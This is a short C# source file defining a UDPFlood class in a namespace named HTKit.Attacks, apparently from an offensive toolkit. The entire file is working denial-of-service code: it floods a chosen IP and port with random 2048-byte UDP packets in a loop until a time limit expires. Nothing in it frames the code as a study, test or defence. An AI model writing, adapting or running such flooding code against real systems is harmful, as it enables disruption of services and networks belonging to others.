using System.Net;
using System.Net.Sockets;

namespace HTKit.Attacks;

public class UDPFlood
{
    public void Start(string targetIp, int targetPort, int timeLimitInSeconds)
    {
        Random random = new Random();
        byte[] buffer = new byte[2048];

        IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);
        DateTime endTime = DateTime.Now.AddSeconds(timeLimitInSeconds);

        while (DateTime.Now < endTime)
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    random.NextBytes(buffer);

                    socket.SendTo(buffer, endPoint);
                }

                Thread.Sleep(10);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending packet: {ex.Message}");
            }
        }
    }
}